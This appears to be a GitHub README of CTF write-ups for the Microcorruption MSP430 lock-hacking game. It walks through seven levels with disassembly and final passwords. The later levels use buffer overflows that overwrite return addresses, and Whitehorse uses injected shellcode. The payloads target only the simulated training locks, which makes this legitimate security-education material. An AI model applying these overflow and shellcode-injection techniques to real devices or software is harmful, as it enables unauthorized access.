# microcorruption
CTF solutions to https://microcorruption.com/

## New Orleans

#### Exploit: Static Analysis

Go to the function `create_password` to find the password created.

```
447e <create_password>
447e:  3f40 0024      mov	#0x2400, r15
4482:  ff40 3100 0000 mov.b	#0x31, 0x0(r15)
4488:  ff40 3d00 0100 mov.b	#0x3d, 0x1(r15)
448e:  ff40 6a00 0200 mov.b	#0x6a, 0x2(r15)
4494:  ff40 6b00 0300 mov.b	#0x6b, 0x3(r15)
449a:  ff40 6700 0400 mov.b	#0x67, 0x4(r15)
44a0:  ff40 7a00 0500 mov.b	#0x7a, 0x5(r15)
44a6:  ff40 3c00 0600 mov.b	#0x3c, 0x6(r15)
44ac:  cf43 0700      mov.b	#0x0, 0x7(r15)
44b0:  3041           ret
```

Password (Hex): `313d6a6b677a3c`

## Sydney

#### Exploit: Static Analysis

Go to function `check_password` to find what we are checking for.

```
448a <check_password>
448a:  bf90 3b2b 0000 cmp	#0x2b3b, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 226d 0200 cmp	#0x6d22, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 317a 0400 cmp	#0x7a31, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 6451 0600 cmp	#0x5164, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
44ac:  0e43           clr	r14
44ae:  0f4e           mov	r14, r15
44b0:  3041           ret
```

In this question, we take note of the concept of endianness.

So `0x2b3b` is really `0x3b` `0x2b`

Password (Hex): `3b2b226d317a6451`

## Hanoi

#### Exploit: Overflowing the checksum

Things are getting harder! Here we are exposed to buffer overflows.

Its all really messy, and it really throws you off. But if you look at the function `login`, there is one line that give it away.

```
455a:  f290 3100 1024 cmp.b	#0x31, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
```

We are granted access when memory space `0x2410` is equal to `0x31`

When we key in our input, we observe that it starts at address `0x2400`

This means that we just need to key in a long enough input starting at `0x2400` and slot in `0x31` at address `0x2410`

Password (String): `AAAAAAAAAAAAAAAA1`

## Cusco

#### Exploit: Overflowing the return address

Another buffer overflow question, but this one deals with return address modification.

In the `login` function, we see that at the end, we add `0x10` to the stack pointer, and return.

```
453a:  3150 1000      add	#0x10, sp
453e:  3041           ret
```

When `ret` is called, it returns to what ever address is stored in the stack pointer. hmmmm... :)

When we key in an input, we see that it starts at address `0x43ee`

Within the function, the stack pointer is moved around.

At the end of the `login` function, the stack pointer moves back to `0x43ee`, and adds `0x10`, and becomes `0x43fe`

It calls `ret` after that, which means that it jumps to whatever address stored in memory space `0x43fe`

Looking at the code, we see that the address for function `unlock_door` is `0x4446`. Translated to ASCII, thats `DF`

We put in an input long enough, so that it's able to overflow into the return address, and write the address of `unlock_door` there.

*Remember about address endian!

Password (String): `AAAAAAAAAAAAAAAAFD`

## Johannesburg

#### Exploit: Overflowing the return address with a checksum

Yet another buffer overflow question, but this one has a small twist to it.

In the `login` function, they have this compare operation that checks if the address is set to `0xc6`

```
...
4578:  f190 c600 1100 cmp.b	#0xc6, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```

The logic checks if the input is too long, and it if overwrites that value.

If the address space does not contain `0xc6`, it stops the program immediately, as it has determined that the user input is too long, and has overwritten that address space.

`ret` is called directly after this, and here we aim to redirect it the `unlock_door` function.

The solution is pretty simple: We send in a longer than normal input, with the value `0xc6` at the correct position `0x11(sp)` (that is, 17 addresses down from the current `sp` address), and we end the input string off with the address of `unlock_door` `0x46 0x44` (endian!)

Because `0xc6` is not anywhere on the ASCII table, we cant send a string. Instead, we send the hex equivalent, wuth the address of `unlock_door` at the end.

Password (Hex): `4141414141414141414141414141414141c64644`

## Reykjavik

#### Exploit: Static Analysis

This one is quite tricky, because not all of the addresses and instructions are shown.

There this long arcane encryption algorithm, which you don't have to sit down and look at (it loops 256 times in case you were wondering)

Instead, we step through the program right after you key in your input. Because the address are not shown in your console below, it can only be seen from the screen on the left, which shows you your current program counter instruction.

After keying in a random password, and stepping through a few times, we see this instruction

```
b490 0e1d dcff
cmp #0x1d0e, -0x24(r4)
```

Where `-0x24(r4)` is the address of your input.

Put simply... we key in an input of `0x0e 0x1d`, and we pass the check!

Password (Hex): `0e1d`

## Whitehorse

#### Exploit: Running a Shell code

In this exercise, we are exposed to a very simple example of corrupting the return address to point to a shell code.

This tactic is very widely used in "real" tools.

We also need to do some manual reading to find out the following important information:

    INT is an interrupt, which does a corresponding action depending on what value is on the stack

    - 0x7D
    
    Takes in two arguments: The password, and an address.
    If this is on the stack on interrupt, we test a password, and if it's correct, we write the a flag to the address
    
    - 0x7E
    
    Takes in one argument: The password
    If this is on the stack on interrupt, we test a password, and if it's correct, we unlock the door
    
    - 0x7F
    
    Takes in no arguments
    If this is on the stack on interrupt, we unlock the door (no password testing required)
    
Quite simply, our shell code needs to place `0x7F` on the stack, and call `INT`.
 
And to call our shell code, we need to overflow the buffer to overwrite the return address to our input
 
Referencing the code, there is an existing chunk that does something similar
 
```
445c:  3012 7e00      push	#0x7e
4460:  b012 3245      call	#0x4532 <INT>
```
    
We need to modify it place `0x7f` on the stack instead of `0x7e`

```
445c:  3012 7f00      push	#0x7f
4460:  b012 3245      call	#0x4532 <INT>
```

Viola! Our shell code is thus `30127f00b0123245`

Now, to call the shell code, we need to overwrite the address of ret to point to it.

All our inputs start at the same address `0x346c`

Keying in password `testing123`, we observe the memory to be

```
3460:   0000 9045 0200 6c34 3000 1245 7465 7374   ...E..l40..Etest
3470:   696e 6731 3233 0000 0000 0000 3c44 0000   ing123......<D..
```

The return address is `0x3c44`, and we have to overwrite that to redirect to `0x346c`, which is the start of our shellcode.

Our shell code `30127f00b0123245` takes up 8 hex values, so we need to fill it with another 8 random characters, and end it with `0x346c` (or `6c34` for endianess) to overwrite the return address

```
3460:   0000 9045 0200 6c34 3000 1245 3012 7f00   ...E..l40..E0. .
3470:   b012 3245 3131 3131 3131 3131 6c34 0000   ..2E11111111l4..
```

Password (Hex): `30127f00b012324531313131313131316c34`
